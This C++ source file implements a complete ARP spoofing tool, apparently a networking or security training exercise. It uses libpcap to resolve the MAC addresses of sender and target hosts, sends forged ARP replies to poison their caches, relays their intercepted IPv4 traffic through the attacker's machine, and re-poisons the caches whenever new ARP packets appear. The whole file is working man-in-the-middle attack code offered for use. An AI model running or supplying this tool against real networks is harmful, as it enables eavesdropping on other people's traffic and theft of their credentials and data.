#include "pch.h"

#include "MacAddress.h"
#include "IpAddress.h"
#include "EthernetHeader.h"
#include "ArpHeader.h"
#include "ArpPacket.h"
#include "Flow.h"

using namespace std;

////////////// resolve sender and target mac address //////////////////////

pcap_t* openCaptureHandle(const char* interfaceName);

MacAddress getMyMacAddress(const char* interfaceName);
IpAddress getMyIpAddress(const char* interfaceName);

ArpPacket makeArpRequestPacket(const MacAddress& myMac, const IpAddress& myIp, const IpAddress& targetIp);

void sendArpRequest(pcap_t* handle, const ArpPacket& packet);
MacAddress receiveArpReply(pcap_t* handle, const IpAddress& targetIp);

MacAddress resolveMacAddress(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, const IpAddress& targetIp);

//////////////////////// infect part /////////////////////////////////////

vector<Flow> parseFlows(int argc, char* argv[]);
void resolveFlowMacAddresses(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, vector<Flow>& flows);

ArpPacket makeArpReplyPacket(const MacAddress& senderMac, const MacAddress& myMac, const IpAddress& targetIp, const IpAddress& senderIp);
void infectFlow(pcap_t* handle, const MacAddress& myMac, const Flow& flow);
void infectFlows(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows); // loof infectflow

////////////////////// relayLoop part ////////////////////////////////////

bool isFromSenderToTarget(const EthernetHeader& ethernetHeader, const Flow& flow);
bool isFromTargetToSender(const EthernetHeader& ethernetHeader, const Flow& flow);

void relayPacket(pcap_t* handle, const u_char* packetData, uint32_t packetLength, const MacAddress& destinationMac);
void relayLoop(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows);

////////////////////////// reinfect //////////////////

void handleArpPacket(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows, const u_char* packetData);

//////////////////////////  function  /////////////////////////////////////////////////////

void usage() 
{
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip> <target ip> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

pcap_t* openCaptureHandle(const char* interfaceName)
{
	char errorBuffer[PCAP_ERRBUF_SIZE]{};

	pcap_t* handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1, errorBuffer);
	
	if (handle == nullptr)
		throw runtime_error(errorBuffer);

	return handle;
}

MacAddress getMyMacAddress(const char* interfaceName) {
	int socketDescriptor = socket(AF_INET, SOCK_DGRAM, 0);
	if (socketDescriptor < 0)
		throw runtime_error("socket() failed");

	struct ifreq interfaceRequest {};
	strncpy(interfaceRequest.ifr_name, interfaceName, IFNAMSIZ - 1);

	if (ioctl(socketDescriptor, SIOCGIFHWADDR, &interfaceRequest) < 0)
	{
		close(socketDescriptor);
		throw runtime_error("ioctl(SIOCGIFHWADDR) failed");
	}

	close(socketDescriptor);

	return MacAddress(reinterpret_cast<uint8_t*>(interfaceRequest.ifr_hwaddr.sa_data));
}

IpAddress getMyIpAddress(const char* interfaceName)
{
	int socketDescriptor = socket(AF_INET, SOCK_DGRAM, 0);
	if (socketDescriptor < 0)
		throw runtime_error("socket() failed");

	struct ifreq interfaceRequest {};
	strncpy(interfaceRequest.ifr_name, interfaceName, IFNAMSIZ - 1);

	if (ioctl(socketDescriptor, SIOCGIFADDR, &interfaceRequest) < 0)
	{
		close(socketDescriptor);
		throw runtime_error("ioctl(SIOCGIFADDR) failed");
	}

	close(socketDescriptor);

	sockaddr_in* internetAddress = reinterpret_cast<sockaddr_in*>(&interfaceRequest.ifr_addr);

	IpAddress myIp; 
	myIp.ipAddress = internetAddress->sin_addr.s_addr;
	return myIp; 

}

ArpPacket makeArpRequestPacket(const MacAddress& myMac, const IpAddress& myIp, const IpAddress& targetIp)
{
	ArpPacket packet{};

	packet.ethernetHeader.destinationMac = MacAddress("ff:ff:ff:ff:ff:ff"); // broadcast
	packet.ethernetHeader.sourceMac = myMac;
	packet.ethernetHeader.etherType = htons(EthernetHeader::kArp);

	packet.arpHeader.hardwareType = htons(ArpHeader::kEthernet);
	packet.arpHeader.protocolType = htons(EthernetHeader::kIpv4);
	packet.arpHeader.hardwareLength = MacAddress::kSize;
	packet.arpHeader.protocolLength = IpAddress::kSize;
	packet.arpHeader.operation = htons(ArpHeader::kRequest);

	packet.arpHeader.sourceMac = myMac;
	packet.arpHeader.sourceIp = myIp;
	packet.arpHeader.targetMac = MacAddress("00:00:00:00:00:00"); // unknown target
	packet.arpHeader.targetIp = targetIp;

	return packet;
}

void sendArpRequest(pcap_t* handle, const ArpPacket& packet)
{
	const int result = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), ArpPacket::kSize);

	if (result != 0)
		throw runtime_error(pcap_geterr(handle));
}

MacAddress receiveArpReply(pcap_t* handle, const IpAddress& targetIp)
{
	while (true)
	{
		struct pcap_pkthdr* header = nullptr;
		const u_char* packetData = nullptr; 

		const int result = pcap_next_ex(handle, &header, &packetData);

		if (result == 0)
			continue;

		if (result < 0)
			throw runtime_error("pcap_next_ex() failed");

		const ArpPacket* packet = reinterpret_cast<const ArpPacket*>(packetData);

		if (packet->ethernetHeader.type() != EthernetHeader::kArp)
			continue;

		if (packet->arpHeader.getOperation() != ArpHeader::kReply)
			continue;

		if (packet->arpHeader.getSourceIp().ipAddress != targetIp.ipAddress)
			continue;

		return packet->arpHeader.getSourceMac();
	}
}

MacAddress resolveMacAddress(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, const IpAddress& targetIp)
{
	ArpPacket requestPacket = makeArpRequestPacket(myMac, myIp, targetIp);
	sendArpRequest(handle, requestPacket);
	MacAddress targetMac = receiveArpReply(handle, targetIp);
	
	return targetMac;
}

vector<Flow> parseFlows(int argc, char* argv[])
{
	vector <Flow> flows;

	for (int index = 2; index < argc; index += 2)
	{
		Flow flow{};
		flow.senderIp = IpAddress(argv[index]);
		flow.targetIp = IpAddress(argv[index + 1]);
		flows.push_back(flow);
	}

	return flows; 
}

void resolveFlowMacAddresses(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, vector<Flow>& flows)
{
	for (Flow& flow : flows)
	{
		flow.senderMac = resolveMacAddress(handle, myMac, myIp, flow.senderIp);
		flow.targetMac = resolveMacAddress(handle, myMac, myIp, flow.targetIp);
	}
}

// infect packet 
ArpPacket makeArpReplyPacket(const MacAddress& senderMac, const MacAddress& myMac, const IpAddress& targetIp, const IpAddress& senderIp)
{
	ArpPacket packet{};

	packet.ethernetHeader.destinationMac = senderMac;
	packet.ethernetHeader.sourceMac = myMac;
	packet.ethernetHeader.etherType = htons(EthernetHeader::kArp);

	packet.arpHeader.hardwareType = htons(ArpHeader::kEthernet);
	packet.arpHeader.protocolType = htons(EthernetHeader::kIpv4);
	packet.arpHeader.hardwareLength = MacAddress::kSize;
	packet.arpHeader.protocolLength = IpAddress::kSize;
	packet.arpHeader.operation = htons(ArpHeader::kReply);

	packet.arpHeader.sourceMac = myMac;
	packet.arpHeader.sourceIp = targetIp;
	packet.arpHeader.targetMac = senderMac;
	packet.arpHeader.targetIp = senderIp;

	return packet;
}

void infectFlow(pcap_t* handle, const MacAddress& myMac, const Flow& flow)
{
	ArpPacket packet = makeArpReplyPacket(flow.senderMac, myMac, flow.targetIp, flow.senderIp);

	const int result = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), ArpPacket::kSize);

	if (result != 0)
		throw runtime_error(pcap_geterr(handle));
}

void infectFlows(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows)
{
	for (const Flow& flow : flows)
	{
		infectFlow(handle, myMac, flow);
	}
}

bool isFromSenderToTarget(const EthernetHeader& ethernetHeader, const Flow& flow)
{
	return 
		memcmp(ethernetHeader.sourceMac.macAddress,
			flow.senderMac.macAddress,MacAddress::kSize) == 0;
}

bool isFromTargetToSender(const EthernetHeader& ethernetHeader, const Flow& flow)
{
	return 
		memcmp(ethernetHeader.sourceMac.macAddress,
			flow.targetMac.macAddress,MacAddress::kSize) == 0;
}

void relayPacket(pcap_t* handle, const u_char* packetData, uint32_t packetLength, const MacAddress& destinationMac)
{
	u_char relayData[65536]{};
	memcpy(relayData, packetData, packetLength);

	EthernetHeader* ethernetHeader = reinterpret_cast<EthernetHeader*>(relayData);
	ethernetHeader->destinationMac = destinationMac;

	const int result = pcap_sendpacket(handle, relayData, packetLength);
	if (result != 0)
		throw runtime_error(pcap_geterr(handle));
}

void handleArpPacket(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows, const u_char* packetData)
{
	const ArpPacket* packet = reinterpret_cast<const ArpPacket*>(packetData);

	if (packet->ethernetHeader.type() != EthernetHeader::kArp)
		return;

	for (const Flow& flow : flows)
	{
		if (packet->arpHeader.getSourceIp().ipAddress == flow.senderIp.ipAddress)
		{
			infectFlow(handle, myMac, flow);
			return;
		}

		if (packet->arpHeader.getSourceIp().ipAddress == flow.targetIp.ipAddress)
		{
			infectFlow(handle, myMac, flow);
			return;
		}
	}
}

void relayLoop(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows)
{
	while (1)
	{
		pcap_pkthdr* header = nullptr;
		const u_char* packetData = nullptr;

		const int result = pcap_next_ex(handle, &header, &packetData);

		if (result == 0)
			continue;
		if (result < 0)
			throw runtime_error("pcap_next_ex() failed");
		
		if (header->caplen < EthernetHeader::kSize)
			continue;

		const EthernetHeader* ethernetHeader = reinterpret_cast<const EthernetHeader*>(packetData);

		if (ethernetHeader->type() == EthernetHeader::kArp)
		{
			if (header->caplen >= ArpPacket::kSize)
				handleArpPacket(handle, myMac, flows, packetData);
			continue;
		}

		// targetMac == myMac packet
		if (memcmp(ethernetHeader->destinationMac.macAddress, myMac.macAddress, MacAddress::kSize) != 0)
			continue;

		// type: IPv4
		if (ethernetHeader->type() != EthernetHeader::kIpv4)
			continue;
		
		for (const Flow& flow : flows)
		{
			if (isFromSenderToTarget(*ethernetHeader, flow)) // case1 sender
			{
				relayPacket(handle, packetData, header->caplen, flow.targetMac);
				break;
			}

			if (isFromTargetToSender(*ethernetHeader, flow)) // case2 target
			{
				relayPacket(handle, packetData, header->caplen, flow.senderMac);
				break; 
			}
		}
	}
}

//////////////////////////////  main  ////////////////////////////////////////////////////////////////////////////
int main(int argc, char* argv[])
{
	if (argc < 4 || argc % 2 != 0) // argument check 
	{
		usage();
		return -1; 
	}
	const char* interfaceName = argv[1];
	vector<Flow> flows = parseFlows(argc, argv); // store flow 
	
	pcap_t* handle = openCaptureHandle(interfaceName);

	MacAddress myMac = getMyMacAddress(interfaceName);
	IpAddress myIp = getMyIpAddress(interfaceName); // get my information 

	resolveFlowMacAddresses(handle, myMac, myIp, flows);
	infectFlows(handle, myMac, flows); // infect
	 
	relayLoop(handle, myMac, flows); // relay 

	pcap_close(handle);
	return 0;
}